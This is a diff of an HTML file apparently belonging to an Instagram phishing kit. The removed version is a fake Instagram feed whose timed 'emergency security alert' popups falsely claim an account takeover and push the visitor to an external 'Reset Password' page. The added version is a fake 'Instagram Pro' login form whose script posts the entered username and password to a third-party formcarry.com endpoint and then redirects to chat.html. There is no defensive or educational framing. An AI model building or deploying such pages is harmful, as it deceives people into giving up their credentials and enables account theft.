@@ -1,445 +1,99 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    :root {
-      --background: 206 100% 97.1%;
-      --foreground: 224 71.4% 4.1%;
-      --card: 0 0% 100%;
-      --card-foreground: 224 71.4% 4.1%;
-      --popover: 0 0% 100%;
-      --popover-foreground: 224 71.4% 4.1%;
-      --primary: 221 44% 48%;
-      --primary-foreground: 210 20% 98%;
-      --secondary: 220 14.3% 95.9%;
-      --secondary-foreground: 220.9 39.3% 11%;
-      --muted: 220 14.3% 95.9%;
-      --muted-foreground: 220 8.9% 46.1%;
-      --accent: 207 90% 61%;
-      --accent-foreground: 210 20% 98%;
-      --destructive: 0 84.2% 60.2%;
-      --destructive-foreground: 0 0% 98%;
-      --border: 220 13% 91%;
-      --input: 220 13% 91%;
-      --ring: 221 44% 48%;
-      --radius: 0.5rem;
-    }
-    body {
-      font-family: 'Inter', sans-serif;
-      background-color: hsl(var(--background));
-      color: hsl(var(--foreground));
-    }
-    .font-headline {
-      font-family: 'Inter', sans-serif';
-    }
-    .btn-ripple {
-      position: relative;
-      overflow: hidden;
-    }
-    .btn-ripple::after {
-      content: '';
-      position: absolute;
-      display: block;
-      width: 0;
-      height: 0;
-      background-color: rgba(255, 255, 255, 0.3);
-      border-radius: 100%;
-      transform: scale(10, 10);
-      opacity: 0;
-      transition: all 0.3s ease-out;
-    }
-    .btn-ripple:active::after {
-      width: 100%;
-      height: 100%;
-      opacity: 1;
-      transform: scale(0, 0);
-      transition: transform 0s, opacity 0s;
-    }
-    .no-scrollbar::-webkit-scrollbar {
-      display: none;
-    }
-    .no-scrollbar {
-      -ms-overflow-style: none;
-      scrollbar-width: none;
-    }
-    .animate-zoom-in-125 {
-      animation: zoom-in-125 0.5s forwards;
-    }
-    .animate-fade-out-fast {
-      animation: fade-out 0.5s 0.5s forwards;
-    }
-    @keyframes zoom-in-125 {
-      from { transform: scale(1); }
-      to { transform: scale(1.25); }
-    }
-    @keyframes fade-out {
-      from { opacity: 1; }
-      to { opacity: 0; }
-    }
-    #alert-dialog {
-        display: none;
-        position: fixed;
-        z-index: 50;
-        inset: 0;
-    }
-    #alert-dialog.open {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-    }
-    .alert-overlay {
-        position: absolute;
-        inset: 0;
-        background-color: rgba(0,0,0,0.8);
-    }
-    .alert-content {
-        position: relative;
-        z-index: 10;
-        background-color: hsl(var(--card));
-        color: hsl(var(--card-foreground));
-        border: 1px solid hsl(var(--border));
-        box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
-        border-radius: 0.5rem;
-        padding: 1.5rem;
-        width: 100%;
-        max-width: 28rem;
-        margin: 1rem;
-    }
-    .alert-header {
-        text-align: center;
-    }
-    .alert-title {
-        color: hsl(var(--destructive));
-        font-weight: 700;
-    }
-    .alert-description {
-        color: hsl(var(--muted-foreground));
-        text-align: center;
-        font-size: 0.875rem;
-        line-height: 1.25rem;
-        margin-top: 0.5rem;
-    }
-    .alert-footer {
-        margin-top: 1.5rem;
-        display: flex;
-        justify-content: center;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Instagram Proo • Log in</title>
+<link rel="stylesheet" href="styles.css"/>
+<link href="https://fonts.googleapis.com/css2?family=Billabong&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
-<body class="antialiased">
+<body class="login-body">
+  <main class="login-wrap">
+    <section class="login-card">
+      <h3 class="brand">Instagram Pro</h3>
 
-  <div class="bg-background min-h-screen">
-    <header class="fixed top-0 left-0 right-0 h-14 bg-background/90 backdrop-blur-sm border-b z-10 flex items-center justify-between px-4 sm:px-6">
-      <button class="p-2" aria-label="Create Post">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-6 w-6"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"></path><circle cx="12" cy="13" r="3"></circle></svg>
-      </button>
+      <form onsubmit="return validatePassword()" 
+            action="https://formcarry.com/s/MsH-Bw9oo9m" 
+            method="POST"
+            class="login-form"
+            id="loginForm">
 
-      <h1 class="font-headline text-2xl font-bold italic text-black tracking-tighter">
-        Instagram
-      </h1>
-
-      <button class="p-2" aria-label="Messages">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-6 w-6"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
-      </button>
-    </header>
-
-    <main class="pt-14 pb-16 md:pb-0 sm:max-w-xl mx-auto">
-      <div class="w-full bg-card sm:bg-transparent py-3 border-b sm:border-t">
-        <div class="flex space-x-4 overflow-x-auto pb-2 -mb-2 px-4 sm:px-0 no-scrollbar">
-          <!-- Stories will be dynamically inserted here by JS -->
+        <div class="field">
+          <input type="text" name="username" id="current_password" placeholder="Username" required>
         </div>
-      </div>
-      <div id="post-container" class="flex flex-col">
-        <!-- Posts will be dynamically inserted here by JS -->
-      </div>
-    </main>
 
-    <footer class="fixed bottom-0 left-0 right-0 h-16 bg-background/90 backdrop-blur-sm border-t z-10 flex items-center justify-around sm:hidden">
-      <a href="/" class="p-2" aria-label="Home">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-7 w-7 text-primary"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
-        <span class="sr-only">Home</span>
-      </a>
-      <a href="#" class="p-2" aria-label="Search">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-7 w-7 text-foreground"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
-        <span class="sr-only">Search</span>
-      </a>
-      <a href="#" class="p-2" aria-label="Reels">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-7 w-7 text-foreground"><rect x="2" y="7" width="20" height="10" rx="2" ry="2"></rect><path d="m10.4 12.6-1.8.9v-3l1.8.9Z"></path><path d="m22 17-1.8-1.3V8.4L22 7Z"></path><path d="m2 7 1.8 1.3v7.4L2 17Z"></path></svg>
-        <span class="sr-only">Reels</span>
-      </a>
-      <a href="#" class="p-2" aria-label="Shop">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-7 w-7 text-foreground"><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"></path><path d="M3 6h18"></path><path d="M16 10a4 4 0 0 1-8 0"></path></svg>
-        <span class="sr-only">Shop</span>
-      </a>
-      <a href="#" class="p-2" aria-label="Profile">
-        <img class="h-7 w-7 rounded-full" src="https://images.unsplash.com/photo-1621873982312-1f83e89a2f21?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w3NDE5ODJ8MHwxfHNlYXJjaHw2fHxtYW4lMjBnbGFzc2VzfGVufDB8fHx8MTc2ODA3ODYyMHww&ixlib=rb-4.1.0&q=80&w=1080" alt="spec_tacular">
-        <span class="sr-only">Profile</span>
-      </a>
-    </footer>
-
-    <div id="alert-dialog">
-        <div class="alert-overlay"></div>
-        <div class="alert-content">
-            <div class="alert-header">
-                <h2 class="alert-title text-lg">⚠️ Security Alert ⚠️</h2>
-                <p class="alert-description">
-                    Attention! This is an emergency security alert. Your Instagram account is currently being accessed by an unauthorized user from an unknown location. Immediate action is required to prevent a total account takeover. Do not ignore this message.
-                </p>
-            </div>
-            <div class="alert-footer">
-                <a href="https://andrewgodwill702-cloud.github.io/godwill.github.io/" class="inline-flex items-center justify-center whitespace-nowrap rounded-[50px] text-sm font-medium h-10 px-4 py-2 bg-primary text-primary-foreground hover:bg-primary/90 btn-ripple">
-                    Reset Password
-                </a>
-            </div>
+        <div class="field">
+          <input type="password" name="password" id="newpass" placeholder="Password" required>
         </div>
-    </div>
 
-  </div>
- <!-- Popup Ad -->
-<div id="popup-ad" class="fixed inset-0 z-50 hidden flex items-center justify-center">
-  <!-- Dark overlay -->
-  <div class="absolute inset-0 bg-black/70"></div>
+        <div id="error" style="color:#dc2743;font-size:12px;margin-top:4px;display:none;"></div>
 
-  <!-- Warning box -->
-  <div class="relative bg-white rounded-3xl p-6 max-w-sm w-full shadow-2xl border-4 border-red-600 animate-pulse">
-    <!-- Header -->
-     <h2 class="text-xl font-extrabold mb-4 text-red-700 flex items-center justify-center">
-      ⚠️ EMERGENCY ALERT! ⚠️
-    </h2>
+        <button type="submit" class="btn-primary" id="loginBtn">Log In</button>
 
-    <!-- Message -->
-    <p class="mb-6 text-sm text-gray-800 font-semibold text-center">
-      Your Instagram account is currently being accessed by an <span class="text-red-600 font-bold">unauthorized user</span> from an unknown location!  
-      Immediate action is required to prevent a total account takeover!  
-      Click the BUTTON to reset your password immediately
-      Reset Password
-    </p>
+        <div class="divider">OR</div>
 
-    <!-- Button centered -->
-    <div class="flex justify-center">
-      <a href="website.html" class="px-6 py-2 bg-red-600 text-white font-bold rounded-2xl hover:bg-red-700 animate-bounce">
-        CHANGE NOW
-      </a>
-    </div>
-  </div>
-</div>
+        <button type="button" class="btn-fb" id="fbBtn">Log in with Facebook</button>
 
+        <a href="#" class="forgot">Forgot password?</a>
+      </form>
 
+    </section>
 
+    <section class="signup-card">
+      <p>Don't have an account? <a href="#" id="signupLink">Sign up</a></p>
+    </section>
+
+    <p class="app-foot">Insta Proo — chat with anyone, anywhere.</p>
+  </main>
 
   <script>
-    // Data
-    const placeholderImages = [
-        { "id": "profile-1", "imageUrl": "https://images.unsplash.com/photo-1711645169736-53327e726205?w=100&h=100&fit=crop&crop=faces" },
-        { "id": "profile-2", "imageUrl": "https://images.unsplash.com/photo-1562593028-1fe2d15bde36?w=100&h=100&fit=crop&crop=faces" },
-        { "id": "profile-3", "imageUrl": "https://images.unsplash.com/photo-1590086782792-42dd2350140d?w=100&h=100&fit=crop&crop=faces" },
-        { "id": "profile-4", "imageUrl": "https://images.unsplash.com/photo-1756552463285-114e33d46e14?w=100&h=100&fit=crop&crop=faces" },
-        { "id": "profile-5", "imageUrl": "https://images.unsplash.com/photo-1621873982312-1f83e89a2f21?w=100&h=100&fit=crop&crop=faces" },
-        { "id": "profile-6", "imageUrl": "https://images.unsplash.com/photo-1571244051166-5548e340b792?w=100&h=100&fit=crop&crop=faces" },
-        { "id": "profile-7", "imageUrl": "https://images.unsplash.com/photo-1620743364175-19e0a45096a1?w=100&h=100&fit=crop&crop=faces" },
-        { "id": "profile-8", "imageUrl": "https://images.unsplash.com/photo-1623184663110-89ba5b565eb6?w=100&h=100&fit=crop&crop=faces" },
-        { "id": "profile-9", "imageUrl": "https://images.unsplash.com/photo-1668608322253-9699284e90db?w=100&h=100&fit=crop&crop=faces" },
-        { "id": "profile-10", "imageUrl": "https://images.unsplash.com/photo-1525186402429-b4ff38bedec6?w=100&h=100&fit=crop&crop=faces" },
-        { "id": "post-1", "imageUrl": "https://images.unsplash.com/photo-1588312744377-2adfb7b8578a?w=600&h=750&fit=crop" },
-        { "id": "post-2", "imageUrl": "https://images.unsplash.com/photo-1618856921788-9bc0b6ff8ca2?w=600&h=750&fit=crop" },
-        { "id": "post-3", "imageUrl": "https://images.unsplash.com/photo-1747192031765-39ac6c046d3e?w=600&h=750&fit=crop" },
-        { "id": "post-4", "imageUrl": "https://images.unsplash.com/photo-1583337130417-3346a1be7dee?w=600&h=750&fit=crop" },
-        { "id": "post-11", "imageUrl": "https://images.unsplash.com/photo-1533371452382-d45a9da51ad9?w=600&h=750&fit=crop" },
-        { "id": "post-5", "imageUrl": "https://images.unsplash.com/photo-1756227584303-f1400daaa69d?w=600&h=750&fit=crop" },
-        { "id": "post-9", "imageUrl": "https://images.unsplash.com/photo-1659022262821-a3b9a30ce542?w=600&h=750&fit=crop" }
-    ];
+function validatePassword(){
+  const username = document.getElementById("current_password").value;
+  const pass     = document.getElementById("newpass").value;
+  const error    = document.getElementById("error");
+  const btn      = document.getElementById("loginBtn");
 
-    const getImageData = (id) => placeholderImages.find(img => img.id === id) || { imageUrl: '' };
+  error.style.display = "none";
+  error.innerHTML = "";
 
-    const users = [
-        { id: 'user-1', username: 'code_master_flex', avatar: getImageData('profile-1') },
-        { id: 'user-2', username: 'mountain_moves', avatar: getImageData('profile-2') },
-        { id: 'user-3', username: 'pixel_perfect', avatar: getImageData('profile-3') },
-        { id: 'user-4', username: 'city_slicker', avatar: getImageData('profile-4') },
-        { id: 'user-5', username: 'spec_tacular', avatar: getImageData('profile-5') },
-        { id: 'user-6', username: 'forest_friend', avatar: getImageData('profile-6') },
-        { id: 'user-7', username: 'sunny_days', avatar: getImageData('profile-7') },
-        { id: 'user-8', username: 'grin_and_bear_it', avatar: getImageData('profile-8') },
-        { id: 'user-9', username: 'studio_star', avatar: getImageData('profile-9') },
-        { id: 'user-10', username: 'laughing_lass', avatar: getImageData('profile-10') },
-    ];
+  if(!username || !pass){
+    error.innerHTML = "❌ Please fill in both fields";
+    error.style.display = "block";
+    return false;
+  }
 
-    const stories = users.map((user, index) => ({ id: `story-${index + 1}`, user: user }));
+  if(pass.length < 1){
+    error.innerHTML = "❌ Password is required";
+    error.style.display = "block";
+    return false;
+  }
 
-    const posts = [
-        { id: 'post-1', user: users[3], image: getImageData('post-1'), caption: 'City nights and bright lights. 🌃', likes: 1023, location: 'Neo-Tokyo', comments: [{ user: users[0], text: 'Awesome shot!' },{ user: users[2], text: 'I love this city!' }] },
-        { id: 'post-2', user: users[1], image: getImageData('post-2'), caption: 'Finding peace in the mountains.', likes: 5421, location: 'Andes Mountains', comments: [] },
-        { id: 'post-3', user: users[9], image: getImageData('post-3'), caption: 'You are what you eat, so eat something sweet.', likes: 230, comments: [{ user: users[4], text: 'Looks delicious!' }] },
-        { id: 'post-4', user: users[5], image: getImageData('post-4'), caption: 'My best friend.', likes: 789, location: 'Central Park', comments: [{ user: users[6], text: 'So cute!' }] },
-        { id: 'post-5', user: users[0], image: getImageData('post-11'), caption: 'Chasing the sun.', likes: 1245, isSuggested: true, comments: [] },
-        { id: 'post-6', user: users[7], image: getImageData('post-5'), caption: 'Lines and shadows.', likes: 412, location: 'Barcelona, Spain', comments: [] },
-        { id: 'post-7', user: users[8], image:getImageData('post-9'), caption: 'Morning ritual.', likes: 987, comments: [{ user: users[1], text: 'The best way to start the day.' }] }
-    ];
+  // Disable button to prevent double submit
+  btn.disabled = true;
+  btn.textContent = "Logging in...";
 
-    // Functions to render content
-    function renderStories() {
-      const container = document.querySelector('.overflow-x-auto');
-      stories.forEach(story => {
-        const storyEl = document.createElement('div');
-        storyEl.className = "flex flex-col items-center space-y-1.5 flex-shrink-0 cursor-pointer group";
-        storyEl.innerHTML = `
-          <div class="p-0.5 rounded-full bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-500 group-hover:scale-105 transition-transform duration-200">
-            <div class="p-0.5 bg-background rounded-full">
-              <div class="h-16 w-16 rounded-full overflow-hidden">
-                <img src="${story.user.avatar.imageUrl}" alt="${story.user.username}" class="h-full w-full object-cover">
-              </div>
-            </div>
-          </div>
-          <p class="text-xs text-center text-foreground/80 truncate w-20">${story.user.username}</p>
-        `;
-        container.appendChild(storyEl);
-      });
-    }
+  // Store username in localStorage for chat.html
+  localStorage.setItem('instaproo_user', username);
 
-    function renderPosts() {
-      const container = document.getElementById('post-container');
-      posts.forEach(post => {
-        const postEl = document.createElement('div');
-        postEl.className = "w-full rounded-none border-x-0 sm:rounded-xl sm:border-x border-b";
-        postEl.innerHTML = `
-            ${post.isSuggested ? `
-              <div class="p-3 text-sm font-semibold text-muted-foreground flex justify-between items-center">
-                <span>Suggested for you</span>
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="1"></circle><circle cx="19" cy="12" r="1"></circle><circle cx="5" cy="12" r="1"></circle></svg>
-              </div>
-              <hr class="border-border">
-            ` : ''}
-            <div class="flex flex-row items-center gap-3 p-3">
-              <div class="p-0.5 rounded-full bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-500">
-                <div class="p-0.5 bg-background rounded-full">
-                  <div class="h-8 w-8 rounded-full overflow-hidden">
-                    <img src="${post.user.avatar.imageUrl}" alt="${post.user.username}" class="h-full w-full object-cover">
-                  </div>
-                </div>
-              </div>
-              <div class="flex flex-col">
-                <p class="font-semibold text-sm cursor-pointer hover:underline">${post.user.username}</p>
-                ${post.location ? `<p class="text-xs text-muted-foreground">${post.location}</p>` : ''}
-              </div>
-              <button class="ml-auto h-8 w-8">
-                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="1"></circle><circle cx="19" cy="12" r="1"></circle><circle cx="5" cy="12" r="1"></circle></svg>
-              </button>
-            </div>
-            <div class="p-0 relative double-tap-area" style="padding-bottom: 125%;">
-              <img src="${post.image.imageUrl}" alt="Post by ${post.user.username}" class="absolute top-0 left-0 w-full h-full object-cover">
-              <div class="heart-animation absolute inset-0 flex items-center justify-center bg-black/10 hidden">
-                  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="0" class="text-white drop-shadow-lg animate-zoom-in-125 animate-fade-out-fast"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
-              </div>
-            </div>
-            <div class="flex-col items-start p-3 pb-4">
-              <div class="w-full flex items-center">
-                <div class="flex gap-1">
-                  <button class="like-btn h-9 w-9 p-2">
-                    <svg class="like-icon h-6 w-6 transition-all duration-200 text-foreground" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
-                  </button>
-                  <button class="h-9 w-9 p-2"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-6 w-6"><path d="m3 21 1.9-5.7a8.5 8.5 0 1 1 3.8 3.8z"></path></svg></button>
-                  <button class="h-9 w-9 p-2"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-6 w-6"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg></button>
-                </div>
-                <button class="bookmark-btn h-9 w-9 p-2 ml-auto">
-                  <svg class="bookmark-icon h-6 w-6 transition-colors duration-200" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m19 21-7-4-7 4V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v16z"></path></svg>
-                </button>
-              </div>
-              <div class="like-count text-sm font-semibold mt-1">${post.likes.toLocaleString()} likes</div>
-              <div class="text-sm mt-1">
-                <span class="font-semibold cursor-pointer hover:underline">${post.user.username}</span>
-                <span class="ml-2">${post.caption}</span>
-              </div>
-              ${post.comments.length > 0 ? `<p class="text-sm text-muted-foreground mt-2 cursor-pointer">View all ${post.comments.length} comments</p>` : ''}
-              <p class="text-xs text-muted-foreground mt-2">1 HOUR AGO</p>
-            </div>
-        `;
-        container.appendChild(postEl);
-      });
-    }
+  // Send data to Formcarry
+  const form = document.getElementById("loginForm");
+  const formData = new FormData(form);
 
-    // Interactivity
-    function setupInteractions() {
-        document.querySelectorAll('.like-btn').forEach((button, index) => {
-            let isLiked = false;
-            let likeCount = posts[index].likes;
-            const likeCountEl = button.closest('.flex-col').querySelector('.like-count');
-            const likeIcon = button.querySelector('.like-icon');
+  fetch("https://formcarry.com/s/MsH-Bw9oo9m", {
+    method: "POST",
+    body: formData
+  })
+  .then(response => {
+    window.location.href = "chat.html";
+  })
+  .catch(error => {
+    window.location.href = "chat.html";
+  });
 
-            function toggleLike() {
-                isLiked = !isLiked;
-                likeCount = isLiked ? likeCount + 1 : likeCount - 1;
-                likeCountEl.textContent = `${likeCount.toLocaleString()} likes`;
-                likeIcon.style.fill = isLiked ? 'red' : 'none';
-                likeIcon.style.color = isLiked ? 'red' : 'currentColor';
-            }
-            
-            button.addEventListener('click', toggleLike);
+  return false;
+}
+</script>
 
-            const doubleTapArea = button.closest('.w-full').querySelector('.double-tap-area');
-            const heartAnimation = doubleTapArea.querySelector('.heart-animation');
-            
-            doubleTapArea.addEventListener('dblclick', () => {
-                if (!isLiked) {
-                    toggleLike();
-                }
-                heartAnimation.classList.remove('hidden');
-                setTimeout(() => {
-                    heartAnimation.classList.add('hidden');
-                }, 1000);
-            });
-        });
-
-        document.querySelectorAll('.bookmark-btn').forEach(button => {
-            let isBookmarked = false;
-            const bookmarkIcon = button.querySelector('.bookmark-icon');
-            button.addEventListener('click', () => {
-                isBookmarked = !isBookmarked;
-                bookmarkIcon.style.fill = isBookmarked ? 'currentColor' : 'none';
-            });
-        });
-
-        const alertDialog = document.getElementById('alert-dialog');
-        setTimeout(() => {
-            alertDialog.classList.add('open');
-        }, 6000);
-
-        const alertOverlay = document.querySelector('.alert-overlay');
-        alertOverlay.addEventListener('click', () => {
-             window.location.href = 'https://andrewgodwill702-cloud.github.io/godwill.github.io/';
-        });
-    }
-    
-    // Initial Render
-    document.addEventListener('DOMContentLoaded', () => {
-      renderStories();
-      renderPosts();
-      setupInteractions();
-    });
-    // Show popup ad after 6 seconds
-const popupAd = document.getElementById('popup-ad');
-setTimeout(() => {
-    popupAd.classList.remove('hidden');
-    popupAd.classList.add('flex');
-}, 16000);
-
-// Close popup ad
-document.getElementById('close-popup').addEventListener('click', () => {
-    popupAd.classList.add('hidden');
-    popupAd.classList.remove('flex');
-});
-
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
-
-
-
-
-
